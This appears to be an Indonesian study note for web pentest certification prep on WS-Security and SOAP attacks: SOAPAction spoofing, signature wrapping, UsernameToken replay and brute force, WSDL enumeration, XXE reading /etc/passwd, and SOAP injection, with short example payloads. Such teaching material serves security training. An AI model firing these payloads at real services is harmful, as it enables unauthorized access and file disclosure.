2026-02-06

Status:

Tags: [[eWPTX]] [[Web Services]]
###### Prasyarat: [[SOAP]]
# WS-Security & SOAP Attacks

## Gambaran singkat WS-Security

WS-Security adalah ekstensi SOAP untuk keamanan di level pesan (message-level): autentikasi, integritas, dan kerahasiaan.

Komponen kunci:
- **UsernameToken**: username/password di SOAP header
- **X.509 Certificates**: digital signature dan enkripsi
- **SAML Tokens**: assertion identitas terfederasi
- **Timestamps**: mencegah replay attack

---

## Vektor Serangan yang Khas SOAP

### 1. SOAPAction Header Spoofing

Header HTTP `SOAPAction` memberi tahu server operasi mana yang “diminta”. Sebagian implementasi terlalu percaya header ini tanpa memvalidasi terhadap isi SOAP body.

```http
POST /service HTTP/1.1
SOAPAction: "getAdminInfo"
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getUserInfo>   <!-- Body says getUserInfo -->
      <id>1</id>
    </getUserInfo>
  </soapenv:Body>
</soapenv:Envelope>
```

Kalau server melakukan routing berdasarkan header SOAPAction (bukan parsing SOAP body), operasi `getAdminInfo` bisa tereksekusi.

### 2. XML Signature Wrapping (XSW)

Menyerang proses verifikasi XML Digital Signature. Signature memvalidasi satu bagian XML, tapi server memproses bagian lain.

**Konsep**:
1. Valid signed message contains `<Operation>getUserInfo</Operation>`
2. Attacker moves the signed element and adds a new unsigned element
3. Signature still validates (it references the original signed node by ID)
4. Server processes the unsigned element: `<Operation>deleteUser</Operation>`

**Varian**: XSW1 sampai XSW8, beda-beda cara memindahkan elemen di dalam SOAP envelope.

### 3. UsernameToken Attack

```xml
<wsse:UsernameToken>
  <wsse:Username>admin</wsse:Username>
  <wsse:Password Type="...#PasswordText">password123</wsse:Password>
  <wsse:Nonce>...</wsse:Nonce>
  <wsu:Created>2026-02-06T00:00:00Z</wsu:Created>
</wsse:UsernameToken>
```

Vektor serangan:
- **Brute force**: no account lockout on the WS-Security layer
- **Replay**: if nonce/timestamp not validated, replay captured tokens
- **Password type downgrade**: switch from `PasswordDigest` to `PasswordText`

### 4. WSDL Information Disclosure

File WSDL sering membocorkan:
- semua operation yang tersedia (termasuk yang admin/internal)
- nama parameter, tipe, dan struktur
- pola penamaan internal
- URL backend service

```bash
# Fetch WSDL
curl https://target.com/service?wsdl

# Look for hidden operations
grep -i "operation name" service.wsdl
grep -i "admin\|delete\|debug\|internal" service.wsdl
```

### 5. XXE in SOAP

Pesan SOAP adalah XML — jadi semua teknik XXE berlaku:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getData>
      <input>&xxe;</input>
    </getData>
  </soapenv:Body>
</soapenv:Envelope>
```

Lihat [[XML External Entities (XXE)]] dan [[Blind & OOB XXE]] untuk tekniknya.

### 6. SOAP Injection

Menyisipkan XML ke parameter SOAP untuk mengubah struktur pesan:

```xml
<!-- Normal input: "John" -->
<name>John</name>

<!-- Injected: closes the tag and adds new element -->
<name>John</name><role>admin</role><foo>
```

Kalau input tidak disanitasi, XML yang disisipkan bisa ikut menjadi bagian pesan SOAP.

---

## Testing Methodology

1. Ambil WSDL lalu enumerasi semua operation
2. Uji tiap operation dengan input valid dan input rusak/malformed
3. Uji manipulasi header SOAPAction
4. Uji XXE pada SOAP body
5. Cek validasi UsernameToken (replay, brute force)
6. Uji SOAP injection pada parameter input
7. Cek apakah WSDL mengekspos operation tersembunyi/admin

---

## Tools

- **SoapUI**: testing dan fuzzing SOAP
- **Burp Suite**: intercept dan modifikasi request SOAP
- **WS-Attacker**: tool otomasi serangan WS-Security (XSW, SOAPAction spoofing)
